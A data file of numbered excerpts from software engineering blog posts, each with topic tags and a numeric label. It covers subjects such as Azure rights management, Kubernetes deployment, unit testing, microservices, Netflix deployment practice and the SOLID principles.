2269,"The service then extracts the Publishing License from the clients request and evaluates it against the requesting users identity. To identify the user, the Azure AD Proxy Addresses attribute is used for the users account and groups to which the user is a member. For performance reasons, group membership is cached. If the user account has no values for the Azure AD Proxy Addresses attribute, the value in the Azure AD User Principal Name is used instead. If the service decides that the user doesnt have rights to the document, then it declines the request at this point. If the user does indeed have rights to consume this document, then the service proceeds with the next step. Notice that the user consuming the content may be from another tenant (and organization) than the user protecting it, so in that case the RAC of the user consuming the content would have been issued by a different tenant than the certificates used to create the policy in the document. This is not a problem since theres an inherent authentication trust between all tenants in Azure (this trust does not extend to authorization, so each access still has to be authorized based on the policies defined by each organization).","['Cloud Computing', 'Azure', 'Information Security', 'Information Protection', 'Cryptography']",11
2270,"Once youve really started to see your user base as co-developers, be sure to give them something to work on. Release early, and release as often as you can. This way, your testers can give you valuable feedback on your implementation, allowing you to fix bugs as fast as possible. With many beta-testers and co-developers, problems will become really easy to spot, since you have lots of people using your software in different ways and getting different results and experiences. With enough eyes looking at the same image, problems and bugs become way easier to spot, and by consequence, easier to fix. Many people looking at the same thing means having multiple points of view, and this proves valuable because while some might be too zoomed-in to be able to get a complete sense of whats going on, someone else might be able to complement this with their broader sight, thus coming to a solution faster.",['Software Development'],13
2271,"However, just like kids with toys, there comes a time when you simply start to lose interest. When you lose interest in a program, your life slowly starts to become dull and boring because youre no longer passionate about solving the problem that once troubled you. You start to release new versions less frequently, you no longer pay attention to your user base, and everything just slowly turns to grey. Thats the moment you need to start thinking about a successor. If you no longer have the need to continue updating your software, find someone else wholl do it for you. This someone needs to remind you of the younger version of yourself that was really passionate about solving a problem, so you need to find a competent successor thatll live up to expectations from the community.",['Software Development'],4
2272,"I have had the luck and pleasure of working with lambda functions recently and boy I am having fun! The idea of having an event-driven execution environment is both daring and exciting. If you are new to the Faa S world, dont worry, the community has already prepared a curated list of reads for you here and here. Have a browse, drink some coffee. As you can see, (because you checked at least one of the links, didnt you?) A huge weight has been lifted. We can now develop, run and manage applications without the intricacy of building and maintaining infrastructure. But with new beginnings, new challenges arise. One of such problems and the reason for this blog is function complexity.","['Serverless', 'Lambda', 'AWS Lambda', 'Middleware', 'Complexity']",9
2273,"A lambda middleware is essentially a function that contributes to managing cross-cutting concerns in a consistent manner. It provides a clear separation of application and business logic and outlines an easy to reason configuration cycle. It is the glue that when adopted by everyone in a team becomes the lingua franca that supports and creates features. But do we really need a middleware? Well, look at the current state of your lambdas and ask yourself a few questions: What does the code look like? Can you envision anyone supporting it in at least 2 years? How much business logic expertise do you need? (if specialised then separation is imperative)Is logic intertwined and hard to reason about? Does the project have a clear path or do you see it going in different directions? How will the project look like the day the expert leaves? Lambcycle is a declarative middleware for lambda functions. It defines a configurable event cycle and allows you to focus on your applications logic. It has a Feature as Plugin approach, so you can easily create your own plugins or reuse your favourite packages with very little effort.","['Serverless', 'Lambda', 'AWS Lambda', 'Middleware', 'Complexity']",9
2274,"10% time is still work time. Its treated like a serious work day. Its just that each engineer is empowered to make their own decision on how to spend this work time to make an impact on the product, to the team and improve themselves. We still expect everyone in the team to provide value back to the business. Just in this case, these are not pre-defined but truly bottom up values.","['Software Development', 'Engineering Culture', 'Innovation', 'Autonomy', 'Iplayer']",1
2275,"Engineers could be solving the wrong problem or the same problem repeatedly. This does happen from time to time. This is where we need the encouragement of more cross-team cross-discipline communication. If multiple engineers in different teams are trying to solve a problem, then we need to spot and encourage them to tackle them together. This is where having a fixed time for 10% is very useful.","['Software Development', 'Engineering Culture', 'Innovation', 'Autonomy', 'Iplayer']",1
2276,"That is secondary to the critique above, however: This is Belshee asking the obvious question. Possibly due to the widely-experienced need for communication of what technical debt is and how it impacts everything software engineers do. Viewed from a business-operations and systems thinking background, however, this question is quite frightening; who is asking this question? Is every developer and CTO not aware of this? The question sounds more like an obvious fact being explained to someone with the wrong mindset: Maybe to someone with localised stone-cutter thinking instead of big-picture cathedral-builder thinking (Stone-cutters and Cathedral-builders, Girard & Lambert, 2007).","['Software Development', 'Product Management', 'Systems Thinking', 'Chief Technology Officer', 'Software Engineering']",12
2277,"The cost and risk, however, is far more highly coupled than when laying masonry. Stone-cutter attitudes may not make a substantial difference to a wall that is being built; but when building the front-end of a new product, or when laying out an new API design, or app architecture, stone-cutter thinking can cause code to contain badly-architected, rushed, unmaintainable, inflexible, code, that not only leads to functional/behavioural bugs but becomes very hard to maintain, debug, or innovate around. The line of thought here is how we can build out from Belshees naming loop to recognise the system we are naming in and why we are naming this way. Our job should be to communicate through code, not just update it.","['Software Development', 'Product Management', 'Systems Thinking', 'Chief Technology Officer', 'Software Engineering']",9
2278,"The impact of not evolving names highlights the core challenge in todays multi-context codebases. Switching from front-end, to back-end, to data-ops, to statistical-code, to some cryptographic blockchain brain-fart of a code-base, we, the builder, have to piece together and hold functioning systems in our minds. We then log the design of the systems within code for the next contractor brave (gullible?) There are two implications here: The obvious one: The code is both the blueprint and the cathedral and should be treated at such. It is design and product in one. We can go full Dipak Chopra metaphysical quantum existence here but I will leave that for you to expand on if you so desire.","['Software Development', 'Product Management', 'Systems Thinking', 'Chief Technology Officer', 'Software Engineering']",5
2279,"Why would a developer follow or not follow the steps and leave a good or bad name for a function, or library, or test? The root is the mindsetstone-cutter thinking will be looking to finish the task at hand, attach a quick unit test to prove their work, and move on (measure the stone, slap it on the wall, and move on). A cathedral-building systems thinker will hold, amongst other concerns, the context of the system in their mindthe purpose of the code within in its domain, the performance relative to how the code has been written, the team of current developers, the lifetime of the system, and the intent and content of what she/he is communicating to future developers (or to themselves in 3 weeks). The communication part of this thinking is what Belshees process seems to be capturing.1.","['Software Development', 'Product Management', 'Systems Thinking', 'Chief Technology Officer', 'Software Engineering']",13
2280,"The naming steps and the debt-reduction process smell so much like a learning loop, I find it impossible not to push it further in that direction. In fact Belshee calls it an insight loop in the following section. This is why I said earlier that we need more discussion of this sort in software engineering. What Belshee has noted down is a mental map of how he acts when naming. In 1974 Argyris and Schn defined this as a Theory of Action. Redrawing the steps and process as a learning loop we see how this maps to single-loop-learning: In the steps laid out, Belshee seems to go around this cycle 7 times to get to the quality of name that he identifies as (my interpretation) maximally performant within the system. We can draw from the work of Argyris and see that in software engineering we already have many double-loop-learning loops that can improve this process. We use code reviews by senior developers and testers to check (external information/validation) whether the naming and information communicated is appropriate. We have pair-programming which allows for rapid learning cycles through the communication between developers as they code. Finally we have Agile driven (or SCRUM if you really insist) retrospectives where we examine the system as a whole and discuss the good and bad of the system: Why do I think this is an appropriate use of learning loops? Argyris and others examined how a firm can behave as a learning organisation. The assumption Ive made here is that all (past, current, and future) developers that exist within the lifecycle of a codebase are a learning organisation that embed their learnings within the code. This knowledge primarily exists in the form of names (names for variables, functions, tests, libraries, domain abstractions etc), as described by Belshees naming process.","['Software Development', 'Product Management', 'Systems Thinking', 'Chief Technology Officer', 'Software Engineering']",14
2281,"In short, you need one federated constitution to underpin the regional-global governance model. I can confidently say that process alignment among the regions is by far the most significant challenge in a global project. Global companies differ from international companies in the consistency of their management processes in different parts of the world. Yes, companies need to customize their products and services to fit the needs of their market. Yes, the local culture plays a role in marketing and sales. Yes, you may need to localize the UI language of your tools, or pay for and track your cost in local currency. However, (I say) the global companies need to maintain a few common principles for supply chain visibility and planning analytics, i.e., demand planning, supply planning, inventory planning, order fulfillment, transportation, logistics management, and KPI measurement: Build and document common assumptions on what demand or supply or inventory constitutes. Distinguish between dependent and independent demand, clarify internal/external supply, segregate inventory in terms of its location and status, etc.","['Big Data', 'Supply Chain', 'Supply Chain Management', 'Analytics', 'Data']",12
2282,"Enhance user experience by customizable UI and reporting. If you are currently complaining about unused ERP reports or an Excel-hell and need to reduce your dependence on IT, then give your users something that matches the Excel experience in flexibility and speed Update your master data at the speed of business to support your plans and reports. Make sure that your units of measure, product hierarchies, life-cycle data, attributes, etc. are current and remain current to support your supply chain visibility and analytics horizon To increase your chances of success, involve the regional teams in your process early and often. Listen to them to learn how they use digital tools. Remember that the millennials are planning your business right now and that all they grew up with better and faster technology a clue to designing durable processes and UIs. The cultural differences across the globe in the digital age are getting smaller and this is good news for global projects, but you need to understand the motivational dynamics of this generation.","['Big Data', 'Supply Chain', 'Supply Chain Management', 'Analytics', 'Data']",6
2283,"Now that we have our Kubernetes cluster created, were ready to start the process of deploying our API. To be able to run our API in our cluster, well first need to create a docker image. If youre unfamiliar with Docker, thats fine, we will cover the basics to get through this tutorial. Assuming you installed Docker earlier in this tutorial (or if you already had it), lets now build our Docker image: This tells docker to build an image based on the provided file -f Dockerfile with the given name:tag pair -t __url__ (GCR).","['Kubernetes', 'Cloud Computing', 'Software Development', 'Google Cloud Platform', 'Software Engineering']",7
2284,"The first thing I want to point out, is the.spec.replicas property. This tells Kubernetes how many pods (instances of your service) with this template should be deployed. This can also be controlled after creation by manually scaling the pods up and down. The next important piece is the container definition. You can define any number of containers per pod by listing them in the.spec.template.spec.containers property. Here, we list the name of the container api, the Docker image to pull __url__ configurations.","['Kubernetes', 'Cloud Computing', 'Software Development', 'Google Cloud Platform', 'Software Engineering']",7
2285,"First off, lets create a Kubernetes service to allow internal cluster traffic to our pods. To do this, we will once again create a Kubernetes resource. However, in this case it will be a service resource type. Our service resource configuration will look like this: The important piece for now, is __url__ property. This is where you list any port forwarding rules, allowing traffic from within the cluster (as well as outside the cluster) through the specified ports. In this case were forwarding our podss port 8080 to port 80 at the cluster level. Were also telling this service to select all pods with the name api via the.spec.selector property.","['Kubernetes', 'Cloud Computing', 'Software Development', 'Google Cloud Platform', 'Software Engineering']",11
2286,"We are now one step closer to being able to hit our API from our computer. Next we need to create what is called an ingress. An ingress is a Kubernetes resource which allows you to define what traffic is allowed into your cluster and where it goes. To create an ingress well once again define it as a Kubernetes resource, it will look like: This tells Kubernetes to create a resource of type Ingress with the given metadata. On Google Cloud, Kubernetes will create a Google L7 Load Balancer with an ephemeral ip by default, and route traffic based on the rules defined in the spec portion of the config. You can find documentation on how this Load Balancer is actually created on GCE here. So in our case, we have all traffic /* going to a Kubernetes service with the name api through port 80.","['Kubernetes', 'Cloud Computing', 'Software Development', 'Google Cloud Platform', 'Software Engineering']",11
2287,"If youre still having issues, Google provides a tool out of the box for all of your hosted services called Stackdriver. Stackdriver automatically reads and stores console output for you, allowing you to more easily debug your applications. This is a good go-to tool for trying to figure out whats wrong with your service (in this case, our API). If this doesnt help, feel free to reach out via comments, Github issues, or twitter and Ill try to help! If you made it this far, congratulations and thanks for sticking with me! At this point, you should now have a Google Cloud project setup, the tools you need installed locally, a Kubernetes cluster created in your Google Cloud project, an API for greeting people, configurations for managing this API in your Kubernetes cluster, and proper services and ingress rules for allowing external traffic to be properly routed to your API. However, were going to go beyond the basics and setup some API monitoring, as well as setup ssl for traffic to our cluster. In the next part of this guide, I will walk you through setting up Googles Endpoints service for your API which will add API monitoring and a bunch of other goodies out of the box.","['Kubernetes', 'Cloud Computing', 'Software Development', 'Google Cloud Platform', 'Software Engineering']",7
2288,"Crusty Cupcake startup company has introduced a great cupcake product. They have one very talented baker in a specially rigged kitchen that can cook a batch of 1000 cupcakes per day. She collects the ingredients, mixes the recipe, bakes the delicious items, artistically decorates them, then packages them and hands them off to the delivery guy. Crusty Cupcakes are a hit, the demand grows to 2,000 cupcakes per day! The CEO decides to add 1 more baker but since the kitchen is customized for 1 baker at a time they must also add a new kitchen. Its hard to find a talented baker with the skills required but they finally find one. Demand grows again to 4,000 cupcakes per day, Crusty Cupcakes is going strong, they decide they must add 2 more bakers and 2 more kitchens. If demand grows to 1,000,000 cupcakes per day, Crusty Cupcakes must have 1,000 bakers and 1000 kitchens a very large infrastructure investment for cupcakes. What happens if Crusty creates a new cupcake flavor? You guessed it, new baker and new kitchen.","['Big Data', 'Kafka', 'Kafka Streams', 'Data Streaming', 'Data']",6
2289,"Writing Unit Tests for a class seems to be a pretty simple taskyou import class you want to cover with tests, you create its instance, call some method with fixed parameters and expect the result to be always the same value, on which you can assert. Unfortunately, its not always the case. Sometimes even creating object requires to create other objects first (e.g. some config, or connections to external services, databases etc. ), and THOSE objects often have their own dependencies to create too, in never-ending spiral of doom. In this article Ill show you simple trick, which can turn this hell into a pleasure of watching test coverage increasing, with relatively small effort.","['Software Development', 'Unit Testing', 'Design Patterns']",9
2290,"It costs timeconnection to remote server will slow down our tests, which in turn will cause them to be executed rarely, turning them in a pile of unused code, which doesnt really serves its purposeit cant detect errors early. Besideswhat if database is unavailable due to some network issue? It stops us from running any tests until its restored BADAs already mentionedwe need to copy all database setup to our testing environment. Againcosts of maintenance of these tests increase.","['Software Development', 'Unit Testing', 'Design Patterns']",13
2291,"Indeed, one small trick can saves us a lot of time. It can isolate code from its external, heavy dependencies (it isnt only about databasesit can be filesystem, server, third party service or literally anything). First, it requires a small refactoring in our codebut its so easy it shouldnt break anything. Consider following change: What did we actually do? We simply extracted everything related to getting access to an external dependency to separate method. So we can subclass and redefine it for tests. Look: By redefining this method, we broke dependency beetween tested class and db. This simple trick allows us to actually test our buisness logic instead of testing database connection, network, and everything else.","['Software Development', 'Unit Testing', 'Design Patterns']",9
2292,"But to be honestits still just a trick. Major problem is still about bad design. Depending on global variables, static methods of concrete classes, or singletons are nowadays considered antipatterns and should be avoided at all. Personallyin this case I would try to use dependency injection I would make of the db constructor parameter of `Employee Service` class, so I can pass a fake implementation to it during tests, instead of subclassing it. Here comes again the statement that good tests induce good design:)Another issue noticed at first glance by an experienced developer in here is that we mix up low level details (db connections, tables and columns) with high level buisiness logic of calculating payments for employees. Breaking this responsabilities to different components would be a good idea, and surely would turn testing easier.","['Software Development', 'Unit Testing', 'Design Patterns']",9
2293,"Malicious software stories fill many publications. Bleeping Computer is practically an active record of malware and security holes. Bulletins such as The Daily WTF are a constant reminder of the general bugginess of applications. The current set of programs leaves much to be desired. Todays software landscape needs a fix. One repair proposed by some is a code of ethics. However, this improvement is unlikely to improve the panorama of todays programs. A code of ethics is an improbable path to better software or the avoidance of poor outcomes.","['Software Development', 'Software Engineering', 'Programming', 'Ethics']",16
2294,"Ethics do not lead to the adoption of sound software engineering practices. An agreed-upon ethos can provide goals, but it does not present a way to achieve those ends. For example, a common objective is a commitment to quality software. However, the intention to reach a target does not equip a developer with the tools to do so. Most programmers intend to produce good products, yet they fall short of that ambition. When goals for excellence are met, engineers are likely to have adopted sound development practices. The adoption of proper engineering habits does not stem from the acceptance of a code of ethics. An ethos can provide ends, but it cannot provide knowledge. The possession of expertise is what leads to compliance with solid software development approaches, not a code of ethics.","['Software Development', 'Software Engineering', 'Programming', 'Ethics']",12
2295,"Conventions for conduct will not lead to better products, while the adoption of proper engineering methods will. To produce better software, a team must embrace sound programming practices. A unit that implements code reviews will produce better systems than a group than merely adheres to a code of ethics. An ethos provides ends, but it does not provide tools. A rule requiring the pursuit of quality does not provide the means of achieving of that goal. Those mechanisms are provided by solid development habits. Fewer defects are associated with improved quality. That purity target is met through sound engineering practices, not a code of ethics.","['Software Development', 'Software Engineering', 'Programming', 'Ethics']",12
2296,"Behavioral conventions do not reduce the likelihood of bad outcomes such as security holes, while solid programming habits do. A mandate for security does not provide the tools that actually decrease the likelihood of exploits. For example, threat modeling decreases protection flaws. However, the tool must be utilized by a team, before any benefits are realized. To accrue any rewards, a group must know that a technique exists, before it can use that approach. Knowledge of a tool such as threat modeling does not flow directly from any behavioral rule. Methods are provided by sound development practices. Good engineering habits reduce the likelihood of bad outcomes, not behavioral mandates.","['Software Development', 'Software Engineering', 'Programming', 'Ethics']",13
2297,"A code of ethics cannot remove a market for certain bad outputs such as malicious software. A product has an economy because that product has both producers and consumers. Ransomware and crypto-miners have people who value them. Individuals are willing to exchange something to acquire that software. Ransomware is being sold on the Dark Web right now. Those products do not appear ex nihilo. They have developers who produce them. Those programmers could be shamed into abstention by a code of ethics, but at least one engineer will find a customer who offers a price high enough to assuage the developers shame. Opprobrium only raises the cost of doing business. A programmer asked to build ransomware demands more in return to build that software. A customer for a crypto-miner requires a larger payout to justify the price demanded by the producer. The developer will not build ransomware or a crypto-miner, unless he knows a buyer is willing to pay his price. As expenditures rise, the number of customers fall, but that number is unlikely to fall to zero. At least one consumer exists for every market, even ones with a strong sense of embarrassment attached to them such as the murder-for-hire industry. If killing for cash cannot be dissuaded by humiliation, then guilt is unlikely to convince a programmer to abstain from building malicious software. If shame cannot stop engineers from building ransomware or crypto-miners, then a code of ethics cannot get rid of the market for certain bad outcomes such as malicious products.","['Software Development', 'Software Engineering', 'Programming', 'Ethics']",16
2298,"Many undesirable results and many disputes are already handled through the existing legal code, making behavioral conventions unnecessary from a jurisprudential standpoint. Ransomware and crypto-miners commit extortion and theft respectively, which are already criminalized acts. Efforts that result in harm also have associated criminal offenses. Even disagreements over legal liability, contracts, or responsibilities are handled through the law already. Jurisprudence in the Anglosphere has been refined and honed over hundreds of years. The current legal system would see little benefit from ratifying into law a code of ethics specific to software developers.","['Software Development', 'Software Engineering', 'Programming', 'Ethics']",16
2299,"The HTML page for this serverless application will be hosted in an Azure Storage account. Users will visit the webpage and submit a message. The form will trigger an Azure Function that will send a message back to the user. There will be no virtual machines involved. Hence the term serverless;)Heres the good news; you dont need to be an experienced programmer to follow along with this tutorial. Ill show you how to build the resources youll need in Azure, and Ill give you some sample code to try out.","['Azure', 'Serverless', 'Cloud Computing']",11
2300,"Take a look at the CLI command below. You can see well be using the az functionapp create command to build the function app. The consumption plan location defines where our code will run and how were billed. Azure Functions consumption plan is billed based on per-second resource consumption and executions and includes a monthly free grant of 1 million requests. Also, pay close attention to thename flag. Like Azure Storage, the name must be a DNS-compliant globally unique value as it will be used as the host portion of the URL for the function app. Make sure you update all the values in the example below and then run the command to create the function app.","['Azure', 'Serverless', 'Cloud Computing']",11
2301,"Cameron: I brought Shereen on the show today because I thought that she would be a great insight to talking about how do we go from idea to product? Shereen, what if a customer comes to us and they have a really good idea, and they want to bring it into Bonzai. How do they go about that? So, lets talk a little bit about how that process works currently. We actually get feedback requests from a number of different sources. Typically, a customer will have a really good idea, either something is missing in the product that theyre struggling with and they want to see improved, or theyve got an idea for something entirely new, that they think will be really cool, that they want to see in the product.","['Agile', 'Scrum', 'Product Management', 'Product Design', 'SaaS']",6
2302,"But I think thats really important. Once the UX is good, then we can get development. I feel like when were getting into development, we run through a bunch of different types of sprints. What are your favorite types of sprints, or how do you like to run your team in the most quick way, lean way? Qumsieh: We have a Bonzai way. I dont really think you could define, like I dont think theres anything out there, thats like this is how Agile or some, theres the different scrum methodologies.","['Agile', 'Scrum', 'Product Management', 'Product Design', 'SaaS']",1
2303,"they promote practices and technologies built for automation. Typically, this relates to supporting continuous practices, deployment pipelines, test automation, and even Blue/Green deployments. Uniformity is also a key factor here; e.g. using Docker/Kubernetes once, provides a blueprint for all other microservices to follow. Generally, this automation focus makes change much more palatable (i.e.","['Microservices', 'Monolith', 'Software Architecture']",10
2304,"Deployment Pipelines (key to many continuous practices) can be built around a small amount of microservice code, with minimal dependencies. The pipeline can automatically retrieve the source from GIT (or another version control), compile it, execute unit tests, and then build it into an deployable artifact (e.g. From there, the pipeline could create a Docker image from it, deploy it to the desired environment, and start the container. Then, the pipeline(s) can execute further automated tests (e.g. acceptance tests), load tests, penetration tests; all through the same microservice REST interface.","['Microservices', 'Monolith', 'Software Architecture']",18
2305,"The classic approach taken to logging on a centralized (monolithic) system (all logs on the same server, and easily gathered) doesnt function in a distributed, cloud-based environment. The problem is twofold: By distributing software execution across many machines, each managing its own log files, and using logging technologies (and formats) specific to the implementation technology, how do we find and combine these distributed logs into a form suitable for fault diagnosis (you cant expect operational staff to access each instance, just to gather logs)? Microservices (and the Cloud) is an entirely different operational model than the familiar on-premise, centralized systems of bygone days. In this distributed, cloud-oriented world, software is (typically) executed within instances/containers (e.g. Docker) that we have little emotional tie to. We treat them as cattle (see later sidebar); we dont nurse the sick back to health; we let them go, and raise another one (in a fraction of the time required of the monolith). However, this ephemeral nature has ramifications around log availability and management.","['Microservices', 'Monolith', 'Software Architecture']",10
2306,"In Scenario A, a hacker who obtains access to the monolith (system and database) gets access to all data within it. This typically occurs when theres a monolithic database that uses one set of credentials to access all data. In Scenario B, we have decentralized the data, per service. Any referential integrity is inferred only, and is linked through service (rather than data) orchestration. The two databases are entirely decoupled (including technologically); one cannot be accessed from another. Gaining access to Service A and its data does not give you access to Service Bs data.","['Microservices', 'Monolith', 'Software Architecture']",8
2307,"The scenario represents a distributed (e.g. The workflow interacts with four different domains (1, 2, 3, and 4) to complete a job. The useful functional value (white, numbered boxes) may be of a relatively short duration, whilst the red bar represents the varying latency costs of network negotiation/transfer/marshalling to talk with the next microservice. The orange bar represents the overall time cost so far. Theres quite a bit of red involved in these distributed interactions.","['Microservices', 'Monolith', 'Software Architecture']",14
2308,"The total impact of your choices should be taken into account in the design process, not just the bits you want to focus onsuch as revenue or growth. Beyond the metrics you are monitoring, what total impact does your software have on its users, on the world? Are there undesirable side effects that outweigh the value proposition? What can you do to address them while preserving the softwares usefulness? Your API has users, thus it has a user experience. In every decision you make, always keep the user in mind. Have empathy for your users, whether they are beginners or experienced developers.",[''],12
2309,"Deliberately design end-to-end workflows, not a set of atomic features. Most developers approach API design by asking: What capabilities should be available? Lets have configuration options for them. Instead, ask: What are the use cases for this tool? For each use case, what is the optimal sequence of user actions? Whats the easiest API that could support this workflow? Atomic options in your API should answer a clear need that arises in a high-level workflowthey should not be added because someone might need it.",[''],19
2310,"If your work has any impact on the world, then this impact has a moral direction. The seemingly innocuous technical choices we make in software products modulate the terms of access to technology, its usage incentives, who will benefit, and who will suffer. Technical choices are also ethical choices. Thus, always be deliberate and explicit about the values you want your choices to support. Bake your values into your creations. Never think, Im just building the capability; that in itself is neutral. It is not because the way you build it determines how it will get used.",[''],16
2311,"In the end, I ended up solving the problem. I dont like the way it was solved but it works and its secure. I never even had to refer to my private keys. And I was able to use the public and several different private repositories. So, how did I do it? Well, I ended up using dep (you can use glide as well) to create a vendor folder. But instead of telling.gitignore and.dockerignore to ignore the folder I actually added it to the repository. This is the part that I dont like. Now I have all of those vendor packages added to my repository.","['Docker', 'Github', 'Repositories', 'Security']",7
2312,"By Andy Glover and Katharina Probst Over the past four years, Netflix has gone from less than 50 Million subscribers to 125 Million subscribers. While this kind of growth has caused us no shortage of scaling challenges, we actually managed to improve the overall availability of our service in that time frame. Along the way, we have learned a lot and now have a much better understanding of what it takes to make our system more highly available. But the news is not all good. The truth is that we learned many of our lessons the hard way: through heroics, through mad scrambles when things went wrong, and sometimes unfortunately through customer-facing incidents. Even though we havent figured everything out and still have many opportunities to improve our systems, we want to share some of the experience we have gained and the tips or best practices we derived. Hopefully some of you will take something away that will save you a wake-up call at 3am for a customer-facing incident.","['Continuous Delivery', 'High Availability', 'Distributed Systems']",17
2313,"Letting people know that a deployment has successfully gone into production is also recommended. This is critical for us operating successfully. Our best practice is to always watch your systems when changes are deployed. When something goes wrong, its important to know what has changed and when. For automated deployments, then, it is particularly important to notify the team so that they know to keep an eye on service health. We use Slack channels internally for notifications. In Spinnaker, Pipelines can notify any channel upon completion that operators want to notify.","['Continuous Delivery', 'High Availability', 'Distributed Systems']",10
2314,"Dont forget to regularly test your non-typical (and typical) deployment pipelines in non-critical situations! We all operate in a world where systems change around us frequently. At Netflix, our hundreds of microservices change on an ongoing basis. Making assumptions, for instance about the state of other systems, can be dangerous. Learning from our own mistakes, we now use preconditions to ensure that assumptions are still valid when we deploy new code or make other changes. This is particularly important for pipelines that execute of long periods of time (possibly from a delay in manual judgement and/or deployment windows). Using precondition stages can verify expected state before potentially destructive actions.","['Continuous Delivery', 'High Availability', 'Distributed Systems']",10
2315,"Operations in Spark are divided between transformations and actions. Transformations are lazy operations that allow Spark to optimize your query under the hood. They will set up a Data Frame for changeslike adding a column, or joining it to anotherbut will not execute on these plans. This can result in surprising results. For instance, its important to remember that the behavior of a UDF is to not have a materialized value until an action is performed. Imagine, for instance, creating an id column using Sparks built-in monotonically_increasing_id, and then trying to join on that column. If you do not place an action between the generation of those ids (such as checkpointing), your values have not been materialized. Checkpointing is basically the process of saving data to disk and reloading it back in, which would be redundant anywhere else besides Spark. This both triggers an action on any waiting transformations, and it also truncates the Spark query plan for that object. Not only will this action show up in your spark UI (thus indicating where exactly you are in your job), it will help to avoid re-triggering latent udf actions in your DAG, and conserve resources, since it can potentially allow you to release memory that would otherwise be cached for downstream access. In our experience, checkpointed data is also a valuable source for data-debugging forensics and repurposing. The training data for our pipeline, for instance, is filtered out from a 500 million row table generated halfway through our application.","['Big Data', 'Spark', 'Scala', 'Engineering', 'Parquet']",8
2316,"If youve been around software for a while, then youve almost certainly heard of the SOLID principles. In short, these are a set of principles intended to help developers write clean, well-structured, and easily-maintainable code. In software, as in any intellectual and creative endeavor, there is quite a bit of debate about the right way to do things. Different practitioners have different ideas about what is right, depending on their individual experiences and inclinations. However, the ideas prescribed by SOLID adherents have been widely adopted in the software community, and agree with them or not, theyre a useful set of principles from which to draw best practices. Moreover, SOLID has been thoroughly integrated into a broader set of Agile development practices and understanding them is thus a virtual requirement in the modern software industry.","['Software Development', 'Programming', 'Coding', 'Learning To Code', 'Software']",12
2317,"Developers and bloggers have written seemingly ad infinitum about SOLID in various places across the web. In researching this article, I encountered many such resources, some of which are cited at the bottom of this article for your reference. So, if the SOLID principles are well-covered elsewhere, why write yet another article about them? In short, for my own edification. Writing about complex topics is one of the best ways to learn them yourself. And for that reason, I am planning a series of five articlesone on each of the SOLID principles. What follows is the first such article and focuses on the single responsibility principle. Although I dont expect my addition to the corpus on this topic will be particularly unique, I hope that it will prove useful to some readers. And with that, lets dive in.","['Software Development', 'Programming', 'Coding', 'Learning To Code', 'Software']",12
2318,"On its face, this seems relatively straightforward. Individual pieces of a programs functionality should be distributed to distinct entities that are capable of handling them without outside assistance. But how do you define an individual piece of a program? What, exactly, is a responsibility and how do you reason about it from a business perspective? Martin, popularly known as Uncle Bob, clarified just this concern in a 2014 blog article where he tied responsibility to the idea of interested actors [3]. Martins article is well worth a read, but to summarize, he argues that if a piece of software has several different kinds of users (aka, actors), then the disparate interests of each of those users defines a piece of that softwares responsibilities. Martin uses the example of C-Suite executives (COO, CTO, CFO), each of whom uses some piece of business software for different reasons. Moreover, when considering how software should be changed, each of those actors should be able to dictate changes in the software without affecting the interests of the other actors.","['Software Development', 'Programming', 'Coding', 'Learning To Code', 'Software']",12
2319,"Admittedly, our space stations arent particularly capable (I guess NASA wont be calling on me any time soon); however, there is still quite a bit to unpack here. Immediately we can see that the Space Station class has several disparate responsibilities. Roughly, we might say that space station operations can be broken down into four areas: sensors; supplies; fuel; and, thrusters. Although personnel are not specified in the class, we can easily imagine different actors who might care about these operational areas. Perhaps a scientist who manages the sensors, a logistical officer who handles supplies, an engineer who manages fuel, and a pilot who manages the thrusters. Given this variety of different operational areas and interested actors, might we say that this class is violating the SRP?","['Software Development', 'Programming', 'Coding', 'Learning To Code', 'Software']",1
2320,"Currently, our Space Station class is a classic example of a so-called God objectthat is, an object that knows about and does everything. This is a major anti-pattern in object-oriented programming and should be avoided. Whats wrong with a God object? Well, for starters, such objects are extremely hard to maintain. Our program is very simple right now but imagine what would happen if we added in some new functionality. Maybe our space station will need crew quarters, or a medical area, or a communications bay. As we added in such functionality, the Space Station class would grow to immense size. Worse yet, each piece of functionality would be inextricably tied to all the others. If we want to change how the fuel tank is managed we might inadvertently break thruster operations. If the station scientist requests changes to sensor operations, those changes could have trickle-down effects to the communications bay.","['Software Development', 'Programming', 'Coding', 'Learning To Code', 'Software']",5
2321,"As you look through this version of the code, you will note several important differences with the first version. Not only are particular pieces of functionality encapsulated in their own classes but they are organized in a manner that is both predictable and consistent. The idea is to group like pieces of functionality in an attempt to follow the cohesion principle and to isolate data such that it is only accessible to relevant actors. Now, if we wanted to change how supplies are managed from a hash structure to an array, we could do so very easily in the Supply Hold class without affecting anything else in the program. Put another way, if the station logistics officer requests changes to her sections functionality, then we can do that without affecting work being done by the station science officer. Meanwhile, the Space Station class has no idea how supplies are being stored and nor does it care! Our users (science officer, pilot, etc.) are probably reasonably happy now with how their relevant parts are broken out, and they can request changes as needed; however, there is still more work we can do. Note, for example, the report_supplies method in the Supply Hold class and the report_fuel method in the Fuel Tank class. What happens if flight control back on Earth asks for a change in the way reports are submitted? Well, we would have to change the Supply Hold and Fuel Tank classes. But what now if flight control decides to change how supplies or fuel are loaded on the station? No problem, well once again change the relevant methods on these classes. Hmm it would seem then that we have multiple reasons for change on these particular classes. That sounds to me like a violation of the SRP! Lets see if we can make a few more adjustments.","['Software Development', 'Programming', 'Coding', 'Learning To Code', 'Software']",15
2322,"Of course, there is still some coupling taking place between our various classes. A Supply Reporter object depends on being handed a Supply Hold object, as does a Fuel Reporter object depend on a Fuel Tank object. Necessarily, the Thrusters too require a Fuel Tank to draw upon. All of this seems reasonable to me, as some linkage is unavoidable, and we could still alter the operations of one object without drastically affecting the others. However, there is still room to improve on this program and to propose changes that would increase flexibility and maintainability (and indeed, I welcome such proposals in the comments!) Whats important for now is that this version of the code is a fairly significant improvement over our first God object version. We have effectively separated responsibilities into individual classes and thus reduced the chances of code changes in one place breaking operations in another. Its also much nicer to work with when updates are needed.","['Software Development', 'Programming', 'Coding', 'Learning To Code', 'Software']",9
